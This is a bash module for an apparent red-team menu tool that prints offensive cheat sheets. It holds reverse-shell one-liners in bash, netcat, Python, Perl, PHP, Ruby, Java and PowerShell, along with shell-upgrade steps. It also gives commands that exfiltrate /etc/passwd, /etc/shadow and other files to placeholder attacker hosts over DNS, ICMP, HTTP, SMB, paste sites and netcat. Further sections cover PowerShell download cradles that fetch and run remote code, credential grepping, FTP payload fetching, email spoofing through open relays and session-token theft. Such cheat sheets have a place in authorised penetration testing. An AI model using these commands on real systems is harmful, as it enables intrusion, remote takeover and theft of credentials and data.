#!/usr/bin/env bash
# modules/red/tips.sh

red_tips() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  💡 RED — Tips & Tricks  " \
            --menu "\n  Useful Tips:\n" 18 65 5 \
            "1" "  🐚  Reverse Shells — All platforms" \
            "2" "  ⬆️   Shell Upgrade — Full TTY" \
            "3" "  📡  Data Exfiltration — Covert methods" \
            "4" "  🧠  Tips & Tricks — Misc" \
            "5" "  🔌  FTP / Email — Non-interactive" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_revshells ;;
            2) _red_shell_upgrade ;;
            3) _red_exfil ;;
            4) _red_misc_tips ;;
            5) _red_nointeract ;;
        esac
    done
}

_red_revshells() { show_page "Reverse Shells — All Platforms" \
"═══════════════════════════════════════════════════════════════
  Reverse Shells — All Platforms                       [RED]
═══════════════════════════════════════════════════════════════

  LISTENER (start FIRST on attacker)
    nc -lvnp 4444
    ncat -lvnp 4444
    socat TCP-LISTEN:4444,reuseaddr -

  BASH
    bash -i >& /dev/tcp/<IP>/4444 0>&1
    bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
    0<&196;exec 196<>/dev/tcp/<IP>/4444; sh <&196 >&196 2>&196

  NETCAT (with -e flag)
    nc -e /bin/bash <IP> 4444
    nc -e /bin/sh <IP> 4444

  NETCAT (without -e flag — pipe trick)
    rm /tmp/f; mkfifo /tmp/f
    cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f

  PYTHON3
    python3 -c 'import socket,subprocess,os
    s=socket.socket()
    s.connect((\"<IP>\",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call([\"/bin/sh\",\"-i\"])'

  PYTHON2
    python -c 'import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((\"<IP>\",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call([\"/bin/sh\",\"-i\"])'

  PERL
    perl -e 'use Socket
    \$i=\"<IP>\";\$p=4444
    socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))
    connect(S,sockaddr_in(\$p,inet_aton(\$i)))
    open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\")
    exec(\"/bin/sh -i\")'

  PHP
    php -r '\$sock=fsockopen(\"<IP>\",4444);
    exec(\"/bin/sh -i <&3 >&3 2>&3\");'

  RUBY
    ruby -rsocket -e 'exit if fork
    c=TCPSocket.new(\"<IP>\",\"4444\")
    while(cmd=c.gets)
    IO.popen(cmd,\"r\"){|io|c.print io.read}end'

  JAVA
    r = Runtime.getRuntime()
    p = r.exec([\"/bin/bash\",\"-c\",
    \"exec 5<>/dev/tcp/<IP>/4444;cat <&5|while read l;do \$l 2>&5 >&5;done\"] as String[])
    p.waitFor()

  TELNET
    telnet <IP> 4444 | /bin/sh | telnet <IP> 4445
    (need two listeners: nc -lvnp 4444 && nc -lvnp 4445)

  POWERSHELL
    powershell -c \"\$c=New-Object Net.Sockets.TCPClient('<IP>',4444)
    \$s=\$c.GetStream()
    [byte[]]\$b=0..65535|%{0}
    while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){
      \$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i)
      \$r=(iex \$d 2>&1|Out-String)
      \$x=\$r+'PS '+(pwd)+'> '
      \$n=\$x.Length
      \$s.Write(\$b,0,\$n)
    }\""; }

_red_shell_upgrade() { show_page "Shell Upgrade — Full TTY" \
"═══════════════════════════════════════════════════════════════
  Shell Upgrade — Full Interactive TTY                 [RED]
═══════════════════════════════════════════════════════════════

  PROBLEM: Basic reverse shells lack:
    - Tab completion
    - Arrow key history
    - Ctrl+C without dying
    - Interactive commands (sudo, ssh, vim)

  METHOD 1 — Python PTY (most common)
    1. On target:
       python3 -c 'import pty; pty.spawn(\"/bin/bash\")'

    2. Ctrl+Z  (background the nc)

    3. On attacker:
       stty raw -echo; fg

    4. On target (hit Enter twice):
       export TERM=xterm
       export SHELL=bash

    5. Fix terminal size:
       stty rows 50 cols 200

  METHOD 2 — Script command
    script /dev/null -c bash
    Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm

  METHOD 3 — Socat (cleanest)
    # Attacker:
    socat file:\`tty\`,raw,echo=0 TCP-LISTEN:4444

    # Target:
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane \\
      TCP:<ATTACKER>:4444

  METHOD 4 — rlwrap
    # Attacker (wrap nc with readline):
    rlwrap nc -lvnp 4444

  GET TERMINAL SIZE
    stty size              (rows cols)
    tput cols; tput lines"; }

_red_exfil() { show_page "Data Exfiltration — Covert Methods" \
"═══════════════════════════════════════════════════════════════
  Data Exfiltration — Covert Methods                   [RED]
═══════════════════════════════════════════════════════════════

  DNS EXFILTRATION (Linux)
    # Exfil command output over ICMP
    ping -c 1 -p \$(cat /etc/passwd | xxd -p | head -1) <IP>

    # DNS exfil (encode data in subdomain queries)
    data=\$(cat /etc/passwd | base64 | tr -d '\\n')
    for i in \$(seq 0 63 \${#data}); do
      chunk=\${data:\$i:63}
      host \${chunk}.<YOUR_DNS_SERVER>
    done

  ICMP EXFIL
    # Send data in ICMP payload
    ping -c 1 -p \$(cat secret.txt | xxd -p | head -1) <ATTACKER>

  HTTP POST EXFIL
    # Linux
    curl -X POST http://<ATTACKER>/upload \\
      -F \"file=@/etc/passwd\"

    # PowerShell
    Invoke-RestMethod -Uri http://<ATTACKER>/upload \\
      -Method POST -InFile C:\\sensitive.txt

  SMB EXFIL
    # Create share on attacker (Impacket)
    smbserver.py share /tmp/loot

    # Copy from target
    copy C:\\sensitive.txt \\\\<ATTACKER>\\share\\

  PASTE SITES (quick, manual)
    curl -X POST https://hastebin.com/documents \\
      --data-binary @/etc/passwd

  BASE64 OVER SHELL
    base64 -w 0 /etc/shadow
    # Copy output, paste to attacker:
    echo '<BASE64>' | base64 -d > shadow.txt

  NETCAT EXFIL
    # Attacker receive:
    nc -lvnp 9999 > loot.tar.gz

    # Target send:
    tar czf - /etc/passwd /etc/shadow | nc <ATTACKER> 9999"; }

_red_misc_tips() { show_page "Tips & Tricks — Miscellaneous" \
"═══════════════════════════════════════════════════════════════
  Tips & Tricks — Miscellaneous                        [RED]
═══════════════════════════════════════════════════════════════

  LIVING OFF THE LAND BINARIES (LOLBins)
    https://lolbas-project.github.io   (Windows)
    https://gtfobins.github.io          (Linux)

  WINDOWS — Run cmd without cmd.exe
    explorer.exe C:\\Windows\\System32\\cmd.exe
    powershell Start-Process cmd

  WINDOWS — PowerShell download cradles
    IEX(New-Object Net.WebClient).DownloadString(\"<URL>\")
    IEX(IWR '<URL>' -UseBasicParsing)
    &([scriptblock]::create((New-Object Net.WebClient).DownloadString(\"<URL>\")))

  LINUX — Useful one-liners
    # Find writable dirs in PATH
    echo \$PATH | tr ':' '\\n' | xargs -I{} find {} -writable 2>/dev/null

    # Quick web server (Python)
    python3 -m http.server 8080

    # Grep recursively for creds
    grep -rn 'password\\|passwd\\|secret' /etc/ /var/www/ 2>/dev/null

    # Watch a file for changes
    watch -n 1 'cat /var/log/auth.log | tail -5'

  STEGANOGRAPHY
    # Hide file in image
    steghide embed -cf image.jpg -ef secret.txt

    # Extract hidden file
    steghide extract -sf image.jpg

    # Detect hidden data
    stegdetect image.jpg

  USEFUL WORDLISTS
    /usr/share/wordlists/rockyou.txt
    /usr/share/seclists/
    https://github.com/danielmiessler/SecLists

  MSCONFIG STARTUP ENTRY REMOVAL
    C:\\> msconfig → Startup → Disable items"; }

_red_nointeract() { show_page "FTP & Email — Non-Interactive Shell" \
"═══════════════════════════════════════════════════════════════
  FTP & Email Through Non-Interactive Shells           [RED]
═══════════════════════════════════════════════════════════════

  FTP THROUGH NON-INTERACTIVE SHELL
    # Create FTP script
    echo open <FTP_IP> 21 > ftp.txt
    echo user <USER> <PASS> >> ftp.txt
    echo binary >> ftp.txt
    echo get payload.exe >> ftp.txt
    echo quit >> ftp.txt

    # Run FTP non-interactively (Windows)
    ftp -v -n -s:ftp.txt

    # Run FTP non-interactively (Linux)
    ftp -n <IP> << 'EOF'
    user <USER> <PASS>
    binary
    get payload.elf
    quit
    EOF

  DNS TRANSFER ON LINUX
    # Perform zone transfer
    dig axfr <DOMAIN> @<DNS_SERVER>
    host -t axfr <DOMAIN> <DNS_SERVER>

  SENDING EMAIL FROM OPEN RELAY (Telnet)
    telnet <RELAY_IP> 25
    EHLO attacker.com
    MAIL FROM: <fake@sender.com>
    RCPT TO: <target@company.com>
    DATA
    Subject: Test
    Hello World
    .
    QUIT

  WGET CAPTURE SESSION TOKEN
    # Start listener, trick victim to load URL:
    wget http://<ATTACKER>/\$(curl -s http://target/session | base64)

  CURL TRICKS
    # Follow redirects
    curl -L <URL>

    # Save cookies
    curl -c cookies.txt <URL>

    # Send cookies
    curl -b cookies.txt <URL>

    # Custom header
    curl -H 'X-Custom: value' <URL>

    # Ignore SSL
    curl -k https://<URL>"; }
